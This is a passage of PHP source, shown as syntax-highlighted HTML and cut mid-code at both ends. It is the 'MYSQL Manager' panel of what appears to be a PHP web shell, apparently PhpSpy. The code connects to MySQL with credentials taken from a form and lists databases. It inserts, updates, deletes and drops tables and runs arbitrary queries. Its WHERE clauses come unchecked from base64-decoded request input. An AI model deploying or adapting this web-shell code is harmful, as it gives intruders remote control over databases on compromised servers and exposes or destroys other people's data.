<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'Database has success backup to &lt;a href="'</span>.$<span style="color: #e7c547;">fileurl</span>.<span style="color: #70c0b1;">'" target=</span><span style="color: #70c0b1; text-decoration: underline;">"_blank"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">path</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">mysql_close(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'Backup failed'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">insert</span> &amp;&amp; $<span style="color: #e7c547;">insertsql</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">keystr</span> = $<span style="color: #e7c547;">valstr</span> = $<span style="color: #e7c547;">tmp</span> = <span style="color: #70c0b1;">''</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span>($<span style="color: #e7c547;">insertsql</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">key</span> =&gt; $<span style="color: #e7c547;">val</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">val</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">keystr</span> .= $<span style="color: #e7c547;">tmp</span><span style="color: #d54e53; font-weight: bold;">.</span>$<span style="color: #e7c547;">key</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">valstr</span> .= $<span style="color: #e7c547;">tmp</span>.<span style="color: #70c0b1;">"'"</span>.<span style="color: #eaeaea; background-color: #000000;">addslashes(</span>$<span style="color: #e7c547;">val</span>).<span style="color: #70c0b1;">"'"</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">tmp</span> = <span style="color: #70c0b1;">','</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">keystr</span> &amp;&amp; $<span style="color: #e7c547;">valstr</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">mysqllink</span> = <span style="color: #eaeaea; background-color: #000000;">mydbconn(</span>$<span style="color: #e7c547;">dbhost</span>,$<span style="color: #e7c547;">dbuser</span>,$<span style="color: #e7c547;">dbpass</span>,$<span style="color: #e7c547;">dbname</span>,$<span style="color: #e7c547;">charset</span>,$<span style="color: #e7c547;">dbpo</span><span style="color: #e7c547; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(q(</span><span style="color: #70c0b1;">"INSERT INTO $tablename ($keystr) VALUES ($valstr)"</span>) ? <span style="color: #70c0b1;">'Insert n</span><span style="color: #70c0b1; text-decoration: underline;">ew record of success'</span><span style="text-decoration: underline;"> : </span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">mysql_error(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">update</span> &amp;&amp; $<span style="color: #e7c547;">insertsql</span> &amp;&amp; $<span style="color: #e7c547;">base64</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">valstr</span> = $<span style="color: #e7c547;">tmp</span> = <span style="color: #70c0b1;">''</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span>($<span style="color: #e7c547;">insertsql</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">key</span> =&gt; $<span style="color: #e7c547;">val</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">valstr</span> .= $<span style="color: #e7c547;">tmp</span><span style="color: #d54e53; font-weight: bold;">.</span>$<span style="color: #e7c547;">key</span>.<span style="color: #70c0b1;">"='"</span>.<span style="color: #eaeaea; background-color: #000000;">addslashes(</span>$<span style="color: #e7c547;">val</span>).<span style="color: #70c0b1;">"'"</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">tmp</span> = <span style="color: #70c0b1;">','</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">valstr</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">where</span> = <span style="color: #eaeaea; background-color: #000000;">base64_decode(</span>$<span style="color: #e7c547;">base64</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">mysqllink</span> = <span style="color: #eaeaea; background-color: #000000;">mydbconn(</span>$<span style="color: #e7c547;">dbhost</span>,$<span style="color: #e7c547;">dbuser</span>,$<span style="color: #e7c547;">dbpass</span>,$<span style="color: #e7c547;">dbname</span>,$<span style="color: #e7c547;">charset</span>,$<span style="color: #e7c547;">dbpo</span><span style="color: #e7c547; text-decoration: underline;">rt</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(q(</span><span style="color: #70c0b1;">"UPDATE $tablename SET $valstr WHERE $where LIMIT 1"</span>) ? <span style="color: #70c0b1;">'Record </span><span style="color: #70c0b1; text-decoration: underline;">updating'</span><span style="text-decoration: underline;"> : </span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">mysql_error(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">doing</span> == <span style="color: #70c0b1;">'del'</span> &amp;&amp; $<span style="color: #e7c547;">base64</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">where</span> = <span style="color: #eaeaea; background-color: #000000;">base64_decode(</span>$<span style="color: #e7c547;">base64</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">delete_sql</span> = <span style="color: #70c0b1;">"DELETE FROM $tablename WHERE $where"</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">mysqllink</span> = <span style="color: #eaeaea; background-color: #000000;">mydbconn(</span>$<span style="color: #e7c547;">dbhost</span>,$<span style="color: #e7c547;">dbuser</span>,$<span style="color: #e7c547;">dbpass</span>,$<span style="color: #e7c547;">dbname</span>,$<span style="color: #e7c547;">charset</span>,$<span style="color: #e7c547;">dbport</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(q(</span><span style="color: #70c0b1;">"DELETE FROM $tablename WHERE $where"</span>) ? <span style="color: #70c0b1;">'Deletion record of success</span><span style="color: #70c0b1; text-decoration: underline;">'</span><span style="text-decoration: underline;"> : </span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">mysql_error(</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   }

<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">tablename</span> &amp;&amp; $<span style="color: #e7c547;">doing</span> == <span style="color: #70c0b1;">'drop'</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">mysqllink</span> = <span style="color: #eaeaea; background-color: #000000;">mydbconn(</span>$<span style="color: #e7c547;">dbhost</span>,$<span style="color: #e7c547;">dbuser</span>,$<span style="color: #e7c547;">dbpass</span>,$<span style="color: #e7c547;">dbname</span>,$<span style="color: #e7c547;">charset</span>,$<span style="color: #e7c547;">dbport</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #eaeaea; background-color: #000000;">q(</span><span style="color: #70c0b1;">"DROP TABLE $tablename"</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'Drop table of success'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">tablename</span> = <span style="color: #70c0b1;">''</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(mysql_error(</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }

<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'MYSQL Manager'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>,<span style="color: #70c0b1;">'mysqladmin'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;p&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'DBHost:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'dbhost'</span>,<span style="color: #70c0b1;">'size'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">20</span>,<span style="color: #70c0b1;">'value'</span>=&gt;$<span style="color: #e7c547;">dbhost</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">':'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'dbport'</span>,<span style="color: #70c0b1;">'size'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">4</span>,<span style="color: #70c0b1;">'value'</span>=&gt;$<span style="color: #e7c547;">dbport</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'DBUser:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'dbuser'</span>,<span style="color: #70c0b1;">'size'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">15</span>,<span style="color: #70c0b1;">'value'</span>=&gt;$<span style="color: #e7c547;">dbuser</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'DBPass:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'dbpass'</span>,<span style="color: #70c0b1;">'size'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">15</span>,<span style="color: #70c0b1;">'value'</span>=&gt;$<span style="color: #e7c547;">dbpass</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'DBCharset:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeselect(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'charset'</span>,<span style="color: #70c0b1;">'option'</span>=&gt;$<span style="color: #e7c547;">charsetdb</span>,<span style="color: #70c0b1;">'selected'</span>=&gt;$<span style="color: #e7c547;">charset</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'nokey'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'connect'</span>,<span style="color: #70c0b1;">'value'</span>=&gt;<span style="color: #70c0b1;">'Connect'</span>,<span style="color: #70c0b1;">'type'</span>=&gt;<span style="color: #70c0b1;">'submit'</span>,<span style="color: #70c0b1;">'class</span><span style="color: #70c0b1; text-decoration: underline;">'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #70c0b1; text-decoration: underline;">'bt'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/p&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfoot(</span>);

<span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#25805;&#20316;&#35760;&#24405;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'recordlist'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'doing'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>,<span style="color: #70c0b1;">'mysqladmin'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'base64'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'tablename'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span>$<span style="color: #e7c547;">dbform</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfoot(</span>);

<span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#36873;&#23450;&#25968;&#25454;&#24211;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'setdbname'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>,<span style="color: #70c0b1;">'mysqladmin'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span>$<span style="color: #e7c547;">dbform</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!$<span style="color: #e7c547;">dbname</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'dbname'</span>);
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfoot(</span>);

<span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#36873;&#23450;&#34920;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'settable'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>,<span style="color: #70c0b1;">'mysqladmin'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span>$<span style="color: #e7c547;">dbform</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'tablename'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'page'</span>,$<span style="color: #e7c547;">page</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'doing'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfoot(</span>);

<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">cachetables</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span>);<span style="color: #d54e53; background-color: #424242;">     </span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">pagenum</span> = <span style="color: #eaeaea; background-color: #000000;">30</span>;
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">page</span> = <span style="color: #eaeaea; background-color: #000000;">intval(</span>$<span style="color: #e7c547;">page</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">page</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">start_limit</span> = ($<span style="color: #e7c547;">page</span> - <span style="color: #eaeaea; background-color: #000000;">1</span>) * $<span style="color: #e7c547;">pagenum</span>;
<span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">start_limit</span> = <span style="color: #eaeaea; background-color: #000000;">0</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">page</span> = <span style="color: #eaeaea; background-color: #000000;">1</span>;
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #eaeaea; background-color: #000000;">isset(</span>$<span style="color: #e7c547;">dbhost</span>) &amp;&amp; <span style="color: #eaeaea; background-color: #000000;">isset(</span>$<span style="color: #e7c547;">dbuser</span>) &amp;&amp; <span style="color: #eaeaea; background-color: #000000;">isset(</span>$<span style="color: #e7c547;">dbpass</span>) &amp;&amp; <span style="color: #eaeaea; background-color: #000000;">isset(</span>$<span style="color: #e7c547;">connect</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">mysqllink</span> = <span style="color: #eaeaea; background-color: #000000;">mydbconn(</span>$<span style="color: #e7c547;">dbhost</span>, $<span style="color: #e7c547;">dbuser</span>, $<span style="color: #e7c547;">dbpass</span>, $<span style="color: #e7c547;">dbname</span>, $<span style="color: #e7c547;">charset</span>, $<span style="color: #e7c547;">dbp</span><span style="color: #e7c547; text-decoration: underline;">ort</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#33719;&#21462;&#25968;&#25454;&#24211;&#20449;&#24687;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">mysqlver</span> = <span style="color: #eaeaea; background-color: #000000;">mysql_get_server_info(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;p&gt;MySQL '</span>.$<span style="color: #e7c547;">mysqlver</span>.<span style="color: #70c0b1;">' running in '</span>.$<span style="color: #e7c547;">dbhost</span>.<span style="color: #70c0b1;">' as '</span>.$<span style="color: #e7c547;">dbuser</span>.<span style="color: #70c0b1;">'@'</span>.$<span style="color: #e7c547;">dbhos</span><span style="color: #e7c547; text-decoration: underline;">t</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">highver</span> = $<span style="color: #e7c547;">mysqlver</span> &gt; <span style="color: #70c0b1;">'4.1'</span> ? <span style="color: #eaeaea; background-color: #000000;">1</span> : <span style="color: #eaeaea; background-color: #000000;">0</span>;

<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#33719;&#21462;&#25968;&#25454;&#24211;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">query</span> = <span style="color: #eaeaea; background-color: #000000;">q(</span><span style="color: #70c0b1;">"SHOW DATABASES"</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dbs</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dbs</span>[] = <span style="color: #70c0b1;">'-- Select a database --'</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">while</span>($<span style="color: #e7c547;">db</span> = <span style="color: #eaeaea; background-color: #000000;">mysql_fetch_array(</span>$<span style="color: #e7c547;">query</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dbs</span>[$<span style="color: #e7c547;">db</span>[<span style="color: #70c0b1;">'Database'</span>]] = $<span style="color: #e7c547;">db</span>[<span style="color: #70c0b1;">'Database'</span>];
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeselect(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'Please select a database:'</span>,<span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'db[]'</span>,<span style="color: #70c0b1;">'op</span><span style="color: #70c0b1; text-decoration: underline;">tion'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #e7c547; text-decoration: underline;">dbs</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'selected'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #e7c547; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'onchange'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #70c0b1; text-decoration: underline;">'moddbname(this.options[this.selectedIndex].value)'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">tabledb</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">dbname</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;p&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'Current dababase: &lt;a href="javascript:moddbname(\''</span>.$<span style="color: #e7c547;">dbname</span>.<span style="color: #70c0b1;">'\');</span><span style="color: #70c0b1; text-decoration: underline;">"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">tablename</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">' | Current Table: &lt;a href="javascript:settable(\''</span>.$<span style="color: #e7c547;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\');"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'&lt;/a&gt; [ &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\', \'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\', \'drop\');"&gt;Drop&lt;/a&gt; ]'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/p&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">mysql_select_db(</span>$<span style="color: #e7c547;">dbname</span>);

<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">getnumsql</span> = <span style="color: #70c0b1;">''</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">runquery</span> = <span style="color: #eaeaea; background-color: #000000;">0</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">sql_query</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">runquery</span> = <span style="color: #eaeaea; background-color: #000000;">1</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">allowedit</span> = <span style="color: #eaeaea; background-color: #000000;">0</span>;
